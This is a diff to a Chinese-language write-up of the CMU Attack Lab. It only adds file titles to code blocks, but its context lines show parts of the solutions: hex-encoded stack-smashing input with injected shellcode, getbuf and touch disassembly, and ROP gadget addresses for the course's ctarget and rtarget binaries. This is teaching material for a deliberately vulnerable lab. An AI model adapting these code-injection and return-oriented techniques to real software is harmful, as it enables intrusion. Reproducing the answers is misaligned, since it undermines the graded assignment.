@@ -58,7 +58,7 @@ objdump -d rtarget > rtarget.asm
 vim exploit.txt
 ```
 
-```text
+```text {title="exploit.txt"}
 68 65 6c 6c 6f
 ```
 
@@ -74,7 +74,7 @@ vim exploit.txt
 cat exploit_raw.txt
 ```
 
-```text
+```text {title="exploit_raw.txt"}
 hello
 ```
 
@@ -104,7 +104,7 @@ Normal return
 
 `exploit.txt` 中的内容：
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
@@ -145,7 +145,7 @@ unsigned getbuf() {
 
 在 `ctarget.asm` 中找到函数 `getbuf` 对应的汇编语句：
 
-```text
+```text {title="ctarget.asm"}
 00000000004017a8 <getbuf>:
   4017a8:   48 83 ec 28             sub    $0x28,%rsp
   4017ac:   48 89 e7                mov    %rsp,%rdi
@@ -165,7 +165,7 @@ unsigned getbuf() {
 
 在 `ctarget.asm` 中找到函数 `touch1` 对应的汇编语句：
 
-```text
+```text {title="ctarget.asm"}
 00000000004017c0 <touch1>:
   ...
 ```
@@ -183,7 +183,7 @@ unsigned getbuf() {
 
 编辑输入文件 `exploit.txt`：
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
@@ -225,7 +225,7 @@ PASS: Would have posted the following:
 
 `exploit.txt` 中的内容：
 
-```text
+```text {title="exploit.txt"}
 48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
@@ -266,7 +266,7 @@ void touch2(unsigned val) {
 
 在 `ctarget.asm` 中找到函数 `touch2` 对应的汇编语句：
 
-```text
+```text {title="ctarget.asm"}
 00000000004017ec <touch2>:
   ...
 ```
@@ -318,7 +318,7 @@ $1 = 0x5561dc78
 
 由此构造汇编代码：
 
-```asm
+```asm {title="level2.s"}
 mov    $0x59b997fa,%rdi
 push   $0x4017ec
 ret
@@ -374,7 +374,7 @@ c3
 
 编辑输入文件 `exploit.txt`：
 
-```text
+```text {title="exploit.txt"}
 48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
@@ -416,7 +416,7 @@ PASS: Would have posted the following:
 
 `exploit.txt` 中的内容：
 
-```text
+```text {title="exploit.txt"}
 48 c7 c7 a8 dc 61 55 68
 fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
@@ -468,7 +468,7 @@ void touch3(char *sval) {
 
 在 `ctarget.asm` 中找到函数 `touch3` 对应的汇编语句：
 
-```text
+```text {title="ctarget.asm"}
 00000000004018fa <touch3>:
   ...
 ```
@@ -501,14 +501,14 @@ Output: 35 39 62 39 39 37 66 61 00
 
 需注意，该字符串不能保存在函数 `getbuf` 的缓冲区中，即函数返回地址在栈中保存位置的下方。否则返回到函数 `touch3` 后，在进行字符串比较前，一系列压栈操作将使缓冲区里的内容被新写入的数据覆盖。如下所示：
 
-```text
+```text {title="ctarget.asm"}
 00000000004018fa <touch3>:
   4018fa:   53                      push   %rbx
   ...
   401911:   e8 36 ff ff ff          callq  40184c <hexmatch>
 ```
 
-```text
+```text {title="ctarget.asm"}
 000000000040184c <hexmatch>:
   40184c:   41 54                   push   %r12
   40184e:   55                      push   %rbp
@@ -556,7 +556,7 @@ c3
 
 编辑输入文件 `exploit.txt`：
 
-```text
+```text {title="exploit.txt"}
 48 c7 c7 a8 dc 61 55 68
 fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
@@ -600,7 +600,7 @@ PASS: Would have posted the following:
 
 `exploit.txt` 中的内容：
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
@@ -652,7 +652,7 @@ mov    $0x59b997fa,%rdi
 
 注意到 gadget farm 中函数 `getval_280` 对应的汇编语句：
 
-```text
+```text {title="rtarget.asm"}
 00000000004019ca <getval_280>:
   4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
   4019cf:   c3                      retq
@@ -671,7 +671,7 @@ ret
 
 注意到 gadget farm 中函数 `addval_273` 对应的汇编语句：
 
-```text
+```text {title="rtarget.asm"}
 00000000004019a0 <addval_273>:
   4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
   4019a6:   c3                      retq
@@ -737,7 +737,7 @@ ec 17 40 00 00 00 00 00             /* the address of touch2        */
 
 编辑输入文件 `exploit.txt`：
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
@@ -782,7 +782,7 @@ PASS: Would have posted the following:
 
 `exploit.txt` 中的内容：
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
@@ -840,7 +840,7 @@ mov    $0x5561dca8,%rdi
 
 注意到 gadget farm 中函数 `addval_190` 对应的汇编语句：
 
-```text
+```text {title="rtarget.asm"}
 0000000000401a03 <addval_190>:
   401a03:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
   401a09:   c3                      retq
@@ -870,7 +870,7 @@ ret
 
 惊奇地注意到 gadget farm 中函数 `add_xy` 对应的汇编语句（竟然还有这种函数）：
 
-```text
+```text {title="rtarget.asm"}
 00000000004019d6 <add_xy>:
   4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
   4019da:   c3                      retq
@@ -906,7 +906,7 @@ ret
 
 注意到 gadget farm 中函数 `addval_436` 对应的汇编语句：
 
-```text
+```text {title="rtarget.asm"}
 0000000000401a11 <addval_436>:
   401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
   401a17:   c3                      retq
@@ -925,7 +925,7 @@ ret
 
 注意到 gadget farm 中函数 `getval_159` 对应的汇编语句：
 
-```text
+```text {title="rtarget.asm"}
 0000000000401a33 <getval_159>:
   401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
   401a38:   c3                      retq
@@ -945,7 +945,7 @@ ret
 
 注意到 gadget farm 中函数 `addval_487` 对应的汇编语句：
 
-```text
+```text {title="rtarget.asm"}
 0000000000401a40 <addval_487>:
   401a40:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
   401a46:   c3                      retq
@@ -1041,7 +1041,7 @@ fa 18 40 00 00 00 00 00             /* the address of touch3        */
 2. 输入由以上分析可知在栈中需要保存的内容；
 3. 输入表示 `cookie` 的值的字符串。
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
@@ -1075,7 +1075,7 @@ fa 18 40 00 00 00 00 00             /* the address of touch3        */
 
 编辑输入文件 `exploit.txt`：
 
-```text
+```text {title="exploit.txt"}
 c2 a9 20 32 30 31 39 20
 43 6f 70 79 72 69 67 68
 74 20 48 61 6b 75 6c 61
